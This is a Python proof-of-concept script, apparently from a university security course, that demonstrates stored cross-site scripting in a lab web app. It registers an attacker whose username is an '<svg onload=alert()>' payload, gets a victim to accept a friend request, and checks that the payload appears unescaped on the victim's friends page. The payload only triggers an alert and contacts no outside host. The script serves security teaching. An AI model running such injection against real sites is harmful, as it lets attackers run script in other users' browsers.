import random
import requests as req

def xssvuln8():
    #### ESTABLISH 2 SESSION OBJECTS, ONE FOR ATTACKER AND ONE FOR THE USER THAT WILL BE ATTACKED
    SERVER = "http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt"
    session = req.session()
    newsession = req.session()

    #### REGISTER A RANDOM USER THAT WILL ATTACK
    user = "<svg onload=alert()>"
    password = str(random.randint(2 ** 27, 2 ** 28))

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/register', data=params)

    #### REGISTER A RANDOM USER THAT WILL BE ATTACKED
    victimuser = str(random.randint(2 ** 27, 2**28))
    victimpassword = str(random.randint(2**27, 2**28))

    victimparams = {'password': victimpassword, 'username':victimuser}
    newr =  newsession.post(SERVER + '/register', data=victimparams)


    #### LOGIN WITH THE ATTACKER
    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

    #### LOGIN WITH THE VICTIM
    victimparams = {'password': victimpassword, 'username': victimuser}
    newr = newsession.post(SERVER +'/login', data=victimparams, cookies=newsession.cookies)


    #### SEND MALICIOUS FRIEND REQUEST TO USER
    r = session.post(SERVER + '/request_friend', data = {'username':victimuser})

    #### FURTHER REFLECTION HAPPENS IN THE /friends RESOURCE SHOULD THE USER ACCEPT A PENDING FRIEND REQUEST FROM A MALICIOUS ATTACKER
    #### ACCEPTING THE MALICIOUS FRIEND REQUEST
    newr = newsession.post(SERVER + '/pending_requests', data={'username': user}, cookies=newsession.cookies)

    #### CHECKING TO SEE IF THE INJECTED 'username' FIELD IS REFLECTED ON THE /friends RESOURCE BY THE VICTIM AFTER HE ACCEPTS THE MALICIOUS REQUEST
    headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
    newr = newsession.get(SERVER + '/friends', headers=headers, cookies=newsession.cookies)
    assert "<svg onload=alert()>" in newr.text


    print(newr.text)
    print(newr.headers)

    #### EASY DEBUG
    print("attacker user: " + user)
    print("attacker pw: " + password)
    print("victim user: " + victimuser)
    print("victim pw: " + victimpassword)

xssvuln8()